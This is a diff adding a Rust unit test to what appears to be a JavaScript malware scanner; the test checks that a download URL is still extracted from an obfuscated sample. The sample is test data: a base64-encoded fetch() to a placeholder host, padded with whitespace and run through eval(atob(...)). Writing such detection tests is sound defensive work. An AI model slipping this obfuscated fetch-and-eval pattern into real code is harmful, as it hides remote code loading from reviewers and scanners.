@@ -10287,6 +10287,38 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_atob_regex_whitespace_class_replace_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-regex-whitespace-class-js.example/p')",
+        );
+        let noisy = encoded
+            .chars()
+            .enumerate()
+            .map(|(idx, ch)| match idx % 3 {
+                0 => format!("{ch}\\t"),
+                1 => format!("{ch}\\r\\n"),
+                _ => format!("{ch} "),
+            })
+            .collect::<String>();
+        let js =
+            format!(r#"var b = "{noisy}"; eval(atob(b.replace(/[ \t\r\n]/g, "")))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-regex-whitespace-class-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob regex whitespace class replace payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_atob_call_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let encoded = base64::Engine::encode(
